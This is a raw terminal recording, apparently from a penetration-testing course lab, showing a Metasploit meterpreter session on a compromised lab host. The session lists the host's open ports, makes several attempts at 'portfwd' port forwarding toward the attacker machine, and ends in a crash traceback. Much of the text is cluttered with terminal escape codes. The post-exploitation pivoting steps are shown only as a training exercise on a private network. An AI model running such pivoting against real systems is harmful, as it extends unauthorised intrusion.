+    tcp    0.0.0.0:8180          0.0.0.0:*             LISTEN       110   0      
+    tcp    0.0.0.0:1524          0.0.0.0:*             LISTEN       0     0      
+    tcp    192.168.58.129:53     0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:21            0.0.0.0:*             LISTEN       0     0      
+    tcp    127.0.0.1:53          0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:59862         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:23            0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6200          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:5432          0.0.0.0:*             LISTEN       108   0      
+    tcp    0.0.0.0:25            0.0.0.0:*             LISTEN       0     0      
+    tcp    127.0.0.1:953         0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:445           0.0.0.0:*             LISTEN       0     0      
+    tcp    192.168.58.129:6200   192.168.58.131:36437  ESTABLISHED  0     0      
+    tcp    192.168.58.129:53410  192.168.58.131:4433   ESTABLISHED  0     0      
+    tcp    :::2121               :::*                  LISTEN       113   0      
+    tcp    :::3632               :::*                  LISTEN       1     0      
+    tcp    :::53                 :::*                  LISTEN       105   0      
+    tcp    :::22                 :::*                  LISTEN       0     0      
+    tcp    :::5432               :::*                  LISTEN       108   0      
+    tcp    ::1:953               :::*                  LISTEN       105   0      
+    udp    0.0.0.0:2049          0.0.0.0:*                          0     0      
+    udp    127.0.0.1:51458       127.0.0.1:51458       ESTABLISHED  108   0      
+    udp    0.0.0.0:60547         0.0.0.0:*                          0     0      
+    udp    192.168.58.129:137    0.0.0.0:*                          0     0      
+    udp    0.0.0.0:137           0.0.0.0:*                          0     0      
+    udp    192.168.58.129:138    0.0.0.0:*                          0     0      
+    udp    0.0.0.0:138           0.0.0.0:*                          0     0      
+    udp    127.0.0.1:161         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:930           0.0.0.0:*                          0     0      
+    udp    192.168.58.129:53     0.0.0.0:*                          105   0      
+    udp    127.0.0.1:53          0.0.0.0:*                          105   0      
+    udp    0.0.0.0:68            0.0.0.0:*                          101   0      
+    udp    0.0.0.0:69            0.0.0.0:*                          0     0      
+    udp    0.0.0.0:45925         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:49517         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:111           0.0.0.0:*                          0     0      
+    udp    0.0.0.0:33022         0.0.0.0:*                          105   0      
+    udp    :::45312              :::*                               105   0      
+    udp    :::53                 :::*                               105   0      
+
+[4mmeterpreter[0m > netstat -tulpn | grep LISTEN | ssh
+[0m
+Connection list
+===============
+
+    Proto  Local address         Remote address        State        User  Inode  PID/Program name
+    -----  -------------         --------------        -----        ----  -----  ----------------
+    tcp    0.0.0.0:512           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:513           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:2049          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:514           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:55141         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:34056         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:44136         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8009          0.0.0.0:*             LISTEN       110   0      
+    tcp    0.0.0.0:6697          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:3306          0.0.0.0:*             LISTEN       109   0      
+    tcp    0.0.0.0:1099          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6667          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:139           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:5900          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:111           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6000          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:81            0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8787          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8180          0.0.0.0:*             LISTEN       110   0      
+    tcp    0.0.0.0:1524          0.0.0.0:*             LISTEN       0     0      
+    tcp    192.168.58.129:53     0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:21            0.0.0.0:*             LISTEN       0     0      
+    tcp    127.0.0.1:53          0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:59862         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:23            0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6200          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:5432          0.0.0.0:*             LISTEN       108   0      
+    tcp    0.0.0.0:25            0.0.0.0:*             LISTEN       0     0      
+    tcp    127.0.0.1:953         0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:445           0.0.0.0:*             LISTEN       0     0      
+    tcp    192.168.58.129:6200   192.168.58.131:36437  ESTABLISHED  0     0      
+    tcp    192.168.58.129:53410  192.168.58.131:4433   ESTABLISHED  0     0      
+    tcp    :::2121               :::*                  LISTEN       113   0      
+    tcp    :::3632               :::*                  LISTEN       1     0      
+    tcp    :::53                 :::*                  LISTEN       105   0      
+    tcp    :::22                 :::*                  LISTEN       0     0      
+    tcp    :::5432               :::*                  LISTEN       108   0      
+    tcp    ::1:953               :::*                  LISTEN       105   0      
+    udp    0.0.0.0:2049          0.0.0.0:*                          0     0      
+    udp    127.0.0.1:51458       127.0.0.1:51458       ESTABLISHED  108   0      
+    udp    0.0.0.0:60547         0.0.0.0:*                          0     0      
+    udp    192.168.58.129:137    0.0.0.0:*                          0     0      
+    udp    0.0.0.0:137           0.0.0.0:*                          0     0      
+    udp    192.168.58.129:138    0.0.0.0:*                          0     0      
+    udp    0.0.0.0:138           0.0.0.0:*                          0     0      
+    udp    127.0.0.1:161         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:930           0.0.0.0:*                          0     0      
+    udp    192.168.58.129:53     0.0.0.0:*                          105   0      
+    udp    127.0.0.1:53          0.0.0.0:*                          105   0      
+    udp    0.0.0.0:68            0.0.0.0:*                          101   0      
+    udp    0.0.0.0:69            0.0.0.0:*                          0     0      
+    udp    0.0.0.0:45925         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:49517         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:111           0.0.0.0:*                          0     0      
+    udp    0.0.0.0:33022         0.0.0.0:*                          105   0      
+    udp    :::45312              :::*                               105   0      
+    udp    :::53                 :::*                               105   0      
+
+[4mmeterpreter[0m > netstat -tulpn | grep LISTEN | ssh[K[C[C[C[C[C[C[C[C[C[C[C[C[C[Cportfwd add -l 22 -p 22 -r 192.168.58.131[C -l 22 -p 22 -r 192.168.58.131- -l 22 -p 22 -r 192.168.58.131L -l 22 -p 22 -r 192.168.58.131
+[0m[1m[31m[-][0m You must supply a local port, remote host, and remote port.
+[4mmeterpreter[0m > portfwd add -L -l 22 -p 22 -r 192.168.58.131[C -l 22 -p 22 -r 192.168.58.1311 -l 22 -p 22 -r 192.168.58.1312 -l 22 -p 22 -r 192.168.58.1317 -l 22 -p 22 -r 192.168.58.131. -l 22 -p 22 -r 192.168.58.1310 -l 22 -p 22 -r 192.168.58.131. -l 22 -p 22 -r 192.168.58.1310 -l 22 -p 22 -r 192.168.58.131. -l 22 -p 22 -r 192.168.58.1311 -l 22 -p 22 -r 192.168.58.131
+[0m[1m[31m[-][0m Error running command portfwd: Rex::BindFailed The address is already in use or unavailable: (127.0.0.1:22).
+[4mmeterpreter[0m > portfwd add -L 127.0.0.1 -l 22 -p 22 -r 192.168.58.131[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[Pnetstat -tulpn | grep LISTEN | ssh[K[K[K[K[K[K[K[K[K[K[K[K[K 192.168.58.131
+[0m
+Connection list
+===============
+
+    Proto  Local address         Remote address        State        User  Inode  PID/Program name
+    -----  -------------         --------------        -----        ----  -----  ----------------
+    tcp    0.0.0.0:512           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:513           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:2049          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:514           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:55141         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:34056         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:44136         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8009          0.0.0.0:*             LISTEN       110   0      
+    tcp    0.0.0.0:6697          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:3306          0.0.0.0:*             LISTEN       109   0      
+    tcp    0.0.0.0:1099          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6667          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:139           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:5900          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:111           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6000          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:81            0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8787          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8180          0.0.0.0:*             LISTEN       110   0      
+    tcp    0.0.0.0:1524          0.0.0.0:*             LISTEN       0     0      
+    tcp    192.168.58.129:53     0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:21            0.0.0.0:*             LISTEN       0     0      
+    tcp    127.0.0.1:53          0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:59862         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:23            0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6200          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:5432          0.0.0.0:*             LISTEN       108   0      
+    tcp    0.0.0.0:25            0.0.0.0:*             LISTEN       0     0      
+    tcp    127.0.0.1:953         0.0.0.0:*             LISTEN       105   0      
+    tcp    0.0.0.0:445           0.0.0.0:*             LISTEN       0     0      
+    tcp    192.168.58.129:6200   192.168.58.131:36437  ESTABLISHED  0     0      
+    tcp    192.168.58.129:53410  192.168.58.131:4433   ESTABLISHED  0     0      
+    tcp    :::2121               :::*                  LISTEN       113   0      
+    tcp    :::3632               :::*                  LISTEN       1     0      
+    tcp    :::53                 :::*                  LISTEN       105   0      
+    tcp    :::22                 :::*                  LISTEN       0     0      
+    tcp    :::5432               :::*                  LISTEN       108   0      
+    tcp    ::1:953               :::*                  LISTEN       105   0      
+    udp    0.0.0.0:2049          0.0.0.0:*                          0     0      
+    udp    127.0.0.1:51458       127.0.0.1:51458       ESTABLISHED  108   0      
+    udp    0.0.0.0:60547         0.0.0.0:*                          0     0      
+    udp    192.168.58.129:137    0.0.0.0:*                          0     0      
+    udp    0.0.0.0:137           0.0.0.0:*                          0     0      
+    udp    192.168.58.129:138    0.0.0.0:*                          0     0      
+    udp    0.0.0.0:138           0.0.0.0:*                          0     0      
+    udp    127.0.0.1:161         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:930           0.0.0.0:*                          0     0      
+    udp    192.168.58.129:53     0.0.0.0:*                          105   0      
+    udp    127.0.0.1:53          0.0.0.0:*                          105   0      
+    udp    0.0.0.0:68            0.0.0.0:*                          101   0      
+    udp    0.0.0.0:69            0.0.0.0:*                          0     0      
+    udp    0.0.0.0:45925         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:49517         0.0.0.0:*                          0     0      
+    udp    0.0.0.0:111           0.0.0.0:*                          0     0      
+    udp    0.0.0.0:33022         0.0.0.0:*                          105   0      
+    udp    :::45312              :::*                               105   0      
+    udp    :::53                 :::*                               105   0      
+
+[4mmeterpreter[0m > portfwd help
+[0mUsage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -R        Indicates a reverse port forward.
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+[4mmeterpreter[0m > portfwd list [K
+[0m
+Active Port Forwards
+====================
+
+   Index  Local       Remote             Direction
+   -----  -----       ------             ---------
+   1      0.0.0.0:22  192.168.58.131:22  Forward
+
+1 total active port forwards.
+
+[4mmeterpreter[0m > portfwd delete 1
+[0m[1m[31m[-][0m You must supply a local port.
+[4mmeterpreter[0m > portfwd delete --h
+[1m[31m[-][0m Session manipulation failed: Too many open files - stty 4500:5:bf:8a3b:3:1c:7f:15:4:0:1:0:11:13:1a:0:12:f:17:16:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0
+ ["/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:7114:in `block in rl_deprep_terminal'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6957:in `retry_if_interrupted'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:7113:in `rl_deprep_terminal'", "/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1512:in `rl_cleanup_after_signal'", "/usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:164:in `rescue in readline_with_output'", "/usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:161:in `readline_with_output'", "/usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:100:in `pgets'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:320:in `get_input_line'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:141:in `run'", "/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'", "/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'", "/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1364:in `cmd_sessions'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "/usr/bin/msfconsole:49:in `<main>'"]
+[1mTraceback[m (most recent call last):
+	5: from /usr/bin/msfconsole:49:in `<main>'
+	4: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	3: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	2: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'
+	1: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `open'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `initialize': [1mToo many open files @ rb_sysopen - /root/.msf4/history ([1;4mErrno::EMFILE[m[1m)
+[m]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# ]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# exit
+
+Script done on 2019-11-28 22:48:31+01:00 [COMMAND_EXIT_CODE="0"]
